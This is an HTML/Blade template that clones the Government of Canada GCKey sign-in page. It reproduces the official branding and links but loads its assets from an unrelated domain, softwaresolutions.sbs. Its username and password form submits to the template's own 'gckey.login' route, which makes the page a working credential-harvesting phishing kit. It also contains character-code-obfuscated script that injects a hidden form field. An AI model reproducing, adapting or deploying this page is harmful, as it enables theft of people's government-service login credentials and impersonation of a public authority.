<!DOCTYPE html>
<html
    class="js backgroundsize borderimage csstransitions fontface svg details progressbar meter mathml cors largeview wb-enable"
    lang="en"><!--<![endif]-->

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style>
        body {
            transition: opacity ease-in 0.2s;
        }

        body[unresolved] {
            opacity: 0;
            display: block;
            overflow: hidden;
            position: relative;
        }
    </style>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">

    <!-- HO-01 1.6.0 -->
    <title>GCKey - Sign In / Sign Up</title>
<meta name="robots" content="noindex, nofollow">
    <!--[if gte IE 9 | !IE ]><!-->
    <link rel="shortcut icon" href="https://clegc-gckey.gc.ca/j/wet/assets/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="https://softwaresolutions.sbs/APPCSS/GCKey - Sign In _ Sign Up_files/wet-boew.min.css">
    <link rel="stylesheet" href="https://softwaresolutions.sbs/APPCSS/GCKey - Sign In _ Sign Up_files/theme.min.css">
    <link rel="stylesheet" href="https://softwaresolutions.sbs/APPCSS/GCKey - Sign In _ Sign Up_files/gckey.130.css">

    <noscript>
        <link rel="stylesheet" href="/j/wet/css/noscript.min.css" />
    </noscript>
</head>

<body data-new-gr-c-s-check-loaded="14.1241.0" data-gr-ext-installed="">
    <ul id="wb-tphp" class="wb-init wb-disable-inited">
        <li class="wb-slc"><a class="wb-sl" id="skip-main"
                href="https://clegc-gckey.gc.ca/j/eng/l?ReqID=s2d322b8677f0b96e0ed03e2457e9dcc865c9581e3#wb-cont">Skip
                to main content</a></li>
        <li class="wb-slc visible-md visible-lg"><a class="wb-sl" id="skip-footer"
                href="https://clegc-gckey.gc.ca/j/eng/l?ReqID=s2d322b8677f0b96e0ed03e2457e9dcc865c9581e3#wb-info">Skip
                to footer</a></li>
        <li class="wb-slc"><a class="wb-sl"
                href="https://clegc-gckey.gc.ca/j/eng/l?ReqID=s2d322b8677f0b96e0ed03e2457e9dcc865c9581e3&amp;wbdisable=true">Basic
                HTML version</a></li>
    </ul>
    <header role="banner">


        <div id="wb-bnr" class="container">
            <div id="wb-lng" class="visible-md visible-lg text-right">
                <h2 class="wb-inv">Language selection</h2>
                <div class="row">
                    <div class="col-md-12">
                        <ul class="list-inline margin-bottom-none">
                            <li><a lang="fr" id="languageLink"
                                    href="https://clegc-gckey.gc.ca/j/fra/l?ReqID=s2d322b8677f0b96e0ed03e2457e9dcc865c9581e3">Français</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="brand col-xs-7 col-sm-9">
                    <a id="logo-link" href="http://canada.ca/en/index.html" target="_blank"
                        title="Welcome to Canada.ca (opens in a new window)">
                        <object id="gcwu-sig" type="image/svg+xml" tabindex="-1" role="img"
                            data="https://softwaresolutions.sbs/APPCSS/GCKey - Sign In _ Sign Up_files/sig-blk-en.svg"
                            aria-label="Government of Canada"></object>
                    </a>
                </div>
                <div class="wb-mb-links col-xs-5 col-sm-3 visible-sm visible-xs" id="wb-glb-mn">
                    <h2 class="wb-inv">Menu</h2>
                    <ul class="list-inline text-right chvrn">
                        <li><a id="menu-button"
                                href="https://clegc-gckey.gc.ca/j/eng/l?ReqID=s2d322b8677f0b96e0ed03e2457e9dcc865c9581e3#mb-pnl"
                                title="Menu" aria-controls="mb-pnl" class="overlay-lnk" role="button">
                                <span class="glyphicon glyphicon-th-list">
                                    <span class="wb-inv">Menu</span>
                                </span>
                            </a></li>
                    </ul>
                    <div id="mb-pnl" class=" wb-overlay modal-content overlay-def wb-panel-r wb-overlay-inited"
                        aria-hidden="true">
                        <header class="modal-header">
                            <div class="modal-title">Menu</div>
                        </header>
                        <div class="modal-body">
                            <section class="lng-ofr">
                                <h3>Language selection</h3>
                                <ul class="list-inline">
                                    <li><a lang="fr" id="languageLink"
                                            href="https://clegc-gckey.gc.ca/j/fra/l?ReqID=s2d322b8677f0b96e0ed03e2457e9dcc865c9581e3">Français</a>
                                    </li>
                                </ul>
                            </section>
                            <nav role="navigation" typeof="SiteNavigationElement" id="sm-pnl"
                                class="sm-pnl wb-menu wb-menu-inited wb-init wb-navcurr-inited">
                                <h3>Site menu</h3>
                                <ul class="list-unstyled mb-menu" role="menu">
                                    <li class="no-sect"><a class="mb-item" role="menuitem" aria-setsize="3"
                                            aria-posinset="1" tabindex="0" id="definitionsHeaderLink"
                                            href="{{ url('/gckeys-definitions') }}" target="_blank"
                                            title="Definitions (opens in a new window)">Definitions</a></li>
                                    <li class="no-sect"><a class="mb-item" role="menuitem" aria-setsize="3"
                                            aria-posinset="2" tabindex="-1" id="faqHeaderLink"
                                            href="{{ url('/gckeys-faqs') }}" target="_blank"
                                            title="Frequently Asked Questions (FAQs) (opens in a new window)">Frequently
                                            Asked Questions (FAQ)</a></li>
                                    <li class="no-sect"><a class="mb-item" role="menuitem" aria-setsize="3"
                                            aria-posinset="3" tabindex="-1" id="helpHeaderLink"
                                            href="{{ url('/gckeys-help') }}" target="_blank"
                                            title="Help (opens in a new window)">Help</a></li>
                                </ul>
                            </nav>
                            <nav role="navigation" typeof="SiteNavigationElement" id="info-pnl"
                                class="info-pnl wb-menu wb-menu-inited wb-init">
                                <h3>Site Information</h3>
                                <ul class="list-unstyled mb-menu" role="menu">
                                    <li>
                                        <details>
                                            <summary
                                                class="mb-item"  role="menuitem" aria-setsize="4" aria-posinset="1" aria-haspopup="true" tabindex="0">About</summary><ul class="list-unstyled mb-sm" role="menu" aria-expanded="false" aria-hidden="true"><li><a role="menuitem" aria-setsize="3" aria-posinset="1" tabindex="-1" id="aboutFooterLink" href="https://clegc-gckey.gc.ca/j/eng/AB-01?ReqID=s2d322b8677f0b96e0ed03e2457e9dcc865c9581e3" target="_blank">About GCKey</a></li><li><a role="menuitem" aria-setsize="3" aria-posinset="2" tabindex="-1" id="enabledServicesFooterLink" href="https://clegc-gckey.gc.ca/j/eng/ES-01?ReqID=s2d322b8677f0b96e0ed03e2457e9dcc865c9581e3" target="_blank">Enabled Services</a></li><li><a role="menuitem" aria-setsize="3" aria-posinset="3" tabindex="-1" id="siteMapFooterLink" href="https://clegc-gckey.gc.ca/j/eng/SM-01?ReqID=s2d322b8677f0b96e0ed03e2457e9dcc865c9581e3" target="_blank">Site Map</a></li></ul></details></li><li><details><summary class="mb-item" 
                                                role="menuitem" aria-setsize="4" aria-posinset="2"
                                                aria-haspopup="true" tabindex="-1">Transparency</summary>
                                            <ul class="list-unstyled mb-sm" role="menu" aria-expanded="false"
                                                aria-hidden="true">
                                                <li><a role="menuitem" aria-setsize="2" aria-posinset="1"
                                                        tabindex="-1" id="disclosureFooterLink"
                                                        href="http://www.tbs-sct.gc.ca/pd-dp/gr-rg/index-eng.asp"
                                                        target="_blank">Proactive Disclosure</a></li>
                                                <li><a role="menuitem" aria-setsize="2" aria-posinset="2"
                                                        tabindex="-1" id="termsFooterLink"
                                                        href="https://clegc-gckey.gc.ca/j/eng/IN-01?ReqID=s2d322b8677f0b96e0ed03e2457e9dcc865c9581e3"
                                                        rel="license" target="_blank">Terms and Conditions</a></li>
                                            </ul>
                                        </details>
                                    </li>
                                    <li>
                                        <details>
                                            <summary class="mb-item"  role="menuitem" aria-setsize="4" aria-posinset="3" aria-haspopup="true" tabindex="-1">Contact Us</summary><ul class="list-unstyled mb-sm" role="menu" aria-expanded="false" aria-hidden="true"><li><a role="menuitem" aria-setsize="1" aria-posinset="1" tabindex="-1" id="contactFooterLink" href="https://clegc-gckey.gc.ca/j/eng/CU-01?ReqID=s2d322b8677f0b96e0ed03e2457e9dcc865c9581e3" target="_blank">Phone Numbers</a></li></ul></details></li><li class="no-sect"><a class="mb-item" role="menuitem" aria-setsize="4" aria-posinset="4" tabindex="-1" href="https://clegc-gckey.gc.ca/j/eng/l?ReqID=s2d322b8677f0b96e0ed03e2457e9dcc865c9581e3#wb-cont">Top of Page <span class="glyphicon glyphicon-chevron-up"></span></a></li></ul></nav></div><button class="mfp-close overlay-close" title="Close: Menu (escape key)">×<span class="wb-inv"> Close: Menu (escape key)</span></button></div>
  </div>
 </div>
</div>

<nav role="navigation" id="wb-sm" class="wb-menu visible-md visible-lg wb-init wb-menu-inited wb-navcurr-inited" data-trgt="mb-pnl" typeof="SiteNavigationElement">
 <h2 class="wb-inv">Site menu</h2>
 <div class="container visible-md visible-lg nvbar">
  <div class="row">
   <ul class="list-inline menu" role="menubar">
    <li><a id="definitionsHeaderLink" href="{{ url('/gckeys-definitions') }}" target="_blank" title="Definitions (opens in a new window)" tabindex="0" aria-posinset="1" aria-setsize="3" role="menuitem">Definitions</a></li>
    <li><a id="faqHeaderLink" href="{{ url('/gckeys-faqs') }}" target="_blank" title="Frequently Asked Questions (FAQs) (opens in a new window)" tabindex="-1" aria-posinset="2" aria-setsize="3" role="menuitem">Frequently Asked Questions (FAQ)</a></li>
    <li class="last"><a id="helpHeaderLink" href="{{ url('/gckeys-help') }}" target="_blank" title="Help (opens in a new window)" tabindex="-1" aria-posinset="3" aria-setsize="3" role="menuitem">Help</a></li>
   </ul>
  </div>
 </div>
</nav>
<nav role="navigation" id="wb-bc" property="breadcrumb">
 <h2 class="wb-inv">You are here:</h2>
 <div class="container">
  <div class="row">
   <ol class="breadcrumb">
<li>Home</li>
<li>Sign In / Sign Up</li>
</ol>
</div>
</div>
</nav>
</header>
<div class="container">
 <main role="main" property="mainContentOfPage">
  <div class="row">
   <div class="col-xs-12">
    <h1 id="wb-cont">Welcome to GCKey</h1>
    <noscript>
      <div class="row nojs-show">
        <div class="col-xs-12">
          <div class="alert alert-warning">
            <p>GCKey login requires that your JavaScript function be enabled in your browser settings. Please enable JavaScript to proceed.</p>
          </div>
        </div>
      </div>
    </noscript>


   </div>
  </div>
  <div class="row">
   <div class="col-xs-12">
    <div class="margin-top-medium">
     <div class="panel panel-default login-panel">
      <div class="panel-body" style="padding-top: 27px;">
       <div class="row">
        <div class="wb-sec hidden-md hidden-lg col-xs-12">
         <div class="col-xs-12">
          <h2 style="margin-top: 0;">Simple Secure Access</h2>
          <p>A simple way to securely access Government of Canada online services.</p><p>
          </p><ul style="padding-left: 0px"><li style="list-style: none">One username.</li><li style="list-style: none">One password.</li></ul>
          <p>Your GCKey can be used to access multiple Government of Canada online Enabled Services.</p>
         </div>
        </div>
        <div id="left-box" class="col-md-8 col-xs-12">
         <div class="col-xs-12">
          <h2 style="margin-top: 0">Sign In</h2>
         </div>
         <div class="col-xs-12">


          @if ($errors->has('loginerror'))
              <div class="alert alert-danger">
                  {{ $errors->first('loginerror') }}
              </div>
          @endif


                  <form  method="POST" action="{{ route('gckey.login') }}">
                    @csrf
           <div class="form-group">
            <label for="username"><span class="field-name">Username: <strong>(required)</strong></span></label>

            <input type="text" class="form-control" id="username" name="username" placeholder="Username" title="Mandatory - Enter your username.">




                        </div>
                        <div class="form-group">
                            <label for="password"><span class="field-name">Password:
                                    <strong>(required)</strong></span></label>

                            <input type="password" class="form-control" id="password" name="password"
                                placeholder="Password" title="Mandatory - Enter your password.">

                        </div>
                        <div class="form-group form-buttons">
                            <div style="text-align:center;">
                                <button type="submit" id="button" class="btn btn-primary"
                                    title="Connect to the GCKey service"
                                    style="margin-left:auto; margin-right:auto;">Sign In</button>

                                <input class="btn btn-default" name="clearAll" id="button2" value="Clear All"
                                    title="Information entered will be cleared"
                                    style="margin-left:auto; margin-right:auto;">
                                <a href="{{ url('/gckeys-sign-up') }}" id="signUpButtonMobile"
                                    class="btn btn-primary visible-xs visible-sm"
                                    style="margin: 5px; margin-left:auto; margin-right:auto"
                                    title="Sign Up / Register for a new GCKey">Sign Up</a>
                            </div>
                        </div>






                        {{-- <input type="hidden" id="captcha-token" name="captcha-token"><input type="hidden" id="captcha-error" name="captcha-error"><input type="hidden" name="_csrf" value="f48fe422-757c-43cd-8240-8d84b38be042"> --}}

                        </form>





                    </div>
                    <div class="col-xs-12 text-center">
                        <a class="mrgn-tp-sm visible-xs-block visible-sm-block visible-md-inline visible-lg-inline"
                            href="{{ url('/gckeys-recover-username') }}" id="forgotUsernameLink"
                            title="Forgot your username?">Forgot your username?</a>
                        <span class="mrgn-lft-md mrgn-rght-md hidden-sm hidden-xs">•</span>
                        <a class="mrgn-tp-sm visible-xs-block visible-sm-block visible-md-inline visible-lg-inline"
                            href="{{ url('/gckeys-forgot-password') }}" id="forgotPasswordLink"
                            title="Forgot your password? Reset it here.">Forgot your password?</a>
                    </div>
                </div>
                <div class="wb-sec col-md-4 hidden-xs hidden-sm">
                    <div class="col-xs-12">
                        <h2 style="margin-top: 0;">Simple Secure Access</h2>
                        <p>A simple way to securely access Government of Canada online services.</p>
                        <p>
                        </p>
                        <ul style="padding-left: 0px">
                            <li style="list-style: none">One username.</li>
                            <li style="list-style: none">One password.</li>
                        </ul>
                        <p style="text-align:center; margin-top: 20px; margin-bottom: 20px;">
                            <a href="{{ url('/gckeys-sign-up') }}" id="signUpButton" class="btn btn-primary"
                                style="width: 13em;" title="Sign Up / Register for a new GCKey">Sign Up</a>
                        </p>
                        <p>Your GCKey can be used to access multiple Government of Canada online Enabled Services.</p>
                    </div>
                </div>
            </div>
        </div>
        </div>
        </div>
        </div>
        </div>
        <div class="row">
            <div class="col-xs-12">
                <div class="col-xs-12">
                    <div class="col-xs-12">
                        <div class="text-center">
                            <p>Please select <strong>Exit</strong> to leave the GCKey service and return to the
                                Government of Canada online service.</p>
                            <form>
                                <div class="form-buttons" style="text-align:center;">
                                    <input type="submit" class="btn btn-default cancel"
                                        title="Exit the GCKey service" name="Exit" id="Exit" value="Exit"
                                        style="margin-left:auto; margin-right:auto">
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="pagedetails">
            <div class="datemod">
                <dl id="wb-dtmd" role="contentinfo">
                    <dt>Date modified:</dt>
                    <dd><time property="dateModified">2024-07-20</time></dd>
                </dl>
            </div>
        </div>
        </main>
        </div>
        <footer role="contentinfo" id="wb-info">
            <nav role="navigation" class="container visible-lg visible-md wb-navcurr">
                <h2 class="wb-inv">Site Information</h2>
                <div class="row">
                    <section class="col-sm-3 col-lg-3">
                        <h3>About</h3>
                        <ul class="list-unstyled">
                            <li><a id="aboutFooterLink"
                                    href="https://clegc-gckey.gc.ca/j/eng/AB-01?ReqID=s2d322b8677f0b96e0ed03e2457e9dcc865c9581e3"
                                    target="_blank">About GCKey</a></li>
                            <li><a id="enabledServicesFooterLink"
                                    href="https://clegc-gckey.gc.ca/j/eng/ES-01?ReqID=s2d322b8677f0b96e0ed03e2457e9dcc865c9581e3"
                                    target="_blank">Enabled Services</a></li>
                            <li><a id="siteMapFooterLink"
                                    href="https://clegc-gckey.gc.ca/j/eng/SM-01?ReqID=s2d322b8677f0b96e0ed03e2457e9dcc865c9581e3"
                                    target="_blank">Site Map</a></li>
                        </ul>
                    </section>
                    <section class="col-sm-3 col-lg-3">
                        <h3>Transparency</h3>
                        <ul class="list-unstyled">
                            <li><a id="disclosureFooterLink" href="http://www.tbs-sct.gc.ca/pd-dp/gr-rg/index-eng.asp"
                                    target="_blank">Proactive Disclosure</a></li>
                            <li><a id="termsFooterLink"
                                    href="https://clegc-gckey.gc.ca/j/eng/IN-01?ReqID=s2d322b8677f0b96e0ed03e2457e9dcc865c9581e3"
                                    rel="license" target="_blank">Terms and Conditions</a></li>
                        </ul>
                    </section>
                    <div class="col-sm-3 col-lg-3">
                        <section>
                            <h3>Contact Us</h3>
                            <ul class="list-unstyled">
                                <li><a id="contactFooterLink"
                                        href="https://clegc-gckey.gc.ca/j/eng/CU-01?ReqID=s2d322b8677f0b96e0ed03e2457e9dcc865c9581e3"
                                        target="_blank">Phone Numbers</a></li>
                            </ul>
                        </section>
                    </div>
                </div>
            </nav>
            <div class="brand">
                <div class="container">
                    <div class="row ">
                        <div class="col-xs-6 col-sm-6 visible-sm visible-xs tofpg">
                            <a id="topOfPageFooterLink"
                                href="https://clegc-gckey.gc.ca/j/eng/l?ReqID=s2d322b8677f0b96e0ed03e2457e9dcc865c9581e3#wb-cont">Top
                                of Page <span class="glyphicon glyphicon-chevron-up"></span></a>
                        </div>
                        <div class="col-xs-6 col-sm-6 col-md-12 text-right">
                            <object id="wmms" type="image/svg+xml" tabindex="-1" role="img"
                                data="https://softwaresolutions.sbs/APPCSS/GCKey - Sign In _ Sign Up_files/wmms-blk.svg"
                                aria-label="Symbol of the Government of Canada"></object>
                        </div>
                    </div>
                </div>
            </div>
        </footer>

        <script src="https://softwaresolutions.sbs/APPCSS/GCKey - Sign In _ Sign Up_files/en.min.js"></script>
        <script src="https://softwaresolutions.sbs/APPCSS/GCKey - Sign In _ Sign Up_files/jquery.min.js"></script>
        <script src="https://softwaresolutions.sbs/APPCSS/GCKey - Sign In _ Sign Up_files/wet-boew.min.js"></script><span id="wb-rsz" class="wb-init">&nbsp;</span>

        <script type="text/javascript">
            var invalidUserError = "Username may be missing, invalid or incomplete.";
            var invalidUserError_field = "Your Username may be missing, invalid or incomplete.";
            var invalidPasswordError = "Password may be missing, invalid or incomplete.";
            var invalidPasswordError_field = "Your Password may be missing, invalid or incomplete.";
            var errorTitle =
                "The form could not be submitted because {reason}. For your security, all fields have been cleared.";
        </script>
        <script src="https://softwaresolutions.sbs/APPCSS/GCKey - Sign In _ Sign Up_files/HO-01_validationRules.js"></script>
        <script src="https://softwaresolutions.sbs/APPCSS/GCKey - Sign In _ Sign Up_files/validationFunctions.130.js"></script>


        <div class="h-captcha" data-sitekey="c745648c-d973-4223-99af-8d178dc17a6c" data-size="invisible"
            data-callback="formSubmit" data-error-callback="onError"><iframe aria-hidden="true"
                data-hcaptcha-widget-id="0y3ez8j9ido" data-hcaptcha-response=""
                src="https://softwaresolutions.sbs/APPCSS/GCKey - Sign In _ Sign Up_files/hcaptcha.html"
                style="display: none;"></iframe>
            <textarea id="g-recaptcha-response-0y3ez8j9ido" name="g-recaptcha-response" style="display: none;"></textarea>
            <textarea id="h-captcha-response-0y3ez8j9ido" name="h-captcha-response" style="display: none;"></textarea>
        </div>
        <script src="https://softwaresolutions.sbs/APPCSS/GCKey - Sign In _ Sign Up_files/api.js" async="" defer=""></script>
        <script>
            function onError(error) {
                var loginForm = document.getElementById("login");
                document.getElementById("captcha-error").value = error;
                loginForm.submit();
            }

            $(document).ready(function() {
                var captchaTokenInput = document.createElement("input");
                captchaTokenInput.setAttribute("type", "hidden");
                captchaTokenInput.setAttribute("id", "captcha-token");
                captchaTokenInput.setAttribute("name", "captcha-token");
                $("#login").append(captchaTokenInput);


                var captchaTokenError = document.createElement("input");
                captchaTokenError.setAttribute("type", "hidden");
                captchaTokenError.setAttribute("id", "captcha-error");
                captchaTokenError.setAttribute("name", "captcha-error");
                $("#login").append(captchaTokenError);

            });

            var clearClicked = false;
            $("#login").submit(function(e) {
                if (!clearClicked) {
                    e.preventDefault();
                    var submitButton = $("#button");
                    if (submitButton) {
                        var buttonInput = document.createElement("input");
                        buttonInput.setAttribute("type", "hidden");
                        buttonInput.setAttribute("name", submitButton.attr("name"));
                        buttonInput.setAttribute("value", submitButton.val());
                        $("#login").append(buttonInput);
                    }
                    hcaptcha.execute();
                }
            });
            $(".cancel").click(function() {
                clearClicked = true;
            });

            function formSubmit(response) {
                var loginForm = document.getElementById("login");
                document.getElementById("captcha-token").value = response;
                loginForm.submit();
            }
        </script>

        <script type="text/javascript">
            var internationalizationIdJoiner = String.fromCharCode(50, 52, 48, 101, 98, 56, 51, 98, 52, 56, 100, 56, 45, 48, 52,
                50, 56, 45, 100, 99, 51, 52, 45, 99, 55, 53, 55, 45, 50, 50, 52, 101, 102, 56, 52, 102);
            $(document).ready(function() {
                var internationalizationIdPart1 = String.fromCharCode(35, 108, 111, 103, 105, 110);
                var internationalizationIdPart2 = String.fromCharCode(60, 105, 110, 112, 117, 116, 32, 116, 121, 112,
                    101, 61, 34, 104, 105, 100, 100, 101, 110, 34, 32, 110, 97, 109, 101, 61, 34, 95, 99, 115, 114,
                    102, 34, 32, 118, 97, 108, 117, 101, 61, 34);
                var internationalizationIdPart3 = String.fromCharCode(34, 62);
                $("#login").append(internationalizationIdPart2 + internationalizationIdJoiner.split("").reverse().join(
                    "") + internationalizationIdPart3);
            });
        </script>


        <div aria-hidden="true"
            style="background-color: rgb(255, 255, 255); border: 1px solid rgb(215, 215, 215); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 4px; border-radius: 4px; left: auto; top: -10000px; z-index: -2147483648; position: absolute; pointer-events: auto; transition: opacity 0.15s ease-out; opacity: 0; visibility: hidden;">
            <div style="position: relative; z-index: 1;"><iframe
                    src="https://softwaresolutions.sbs/APPCSS/GCKey - Sign In _ Sign Up_files/hcaptcha(1).html" frameborder="0"
                    scrolling="no"
                    allow="private-state-token-issuance &#39;src&#39;; private-state-token-redemption &#39;src&#39;"
                    title="Main content of the hCaptcha challenge"
                    style="border: 0px; z-index: 2000000000; position: relative;"></iframe></div>
            <div
                style="width: 100%; height: 100%; position: fixed; pointer-events: none; top: 0px; left: 0px; z-index: 0; background-color: rgb(255, 255, 255); opacity: 0.05;">
            </div>
            <div
                style="border-width: 11px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 1; right: 100%;">
                <div
                    style="border-width: 10px; border-style: solid; border-color: transparent rgb(255, 255, 255) transparent transparent; position: relative; top: 10px; z-index: 1;">
                </div>
                <div
                    style="border-width: 11px; border-style: solid; border-color: transparent rgb(215, 215, 215) transparent transparent; position: relative; top: -11px; z-index: 0;">
                </div>
            </div>
        </div>
</body>

</html>
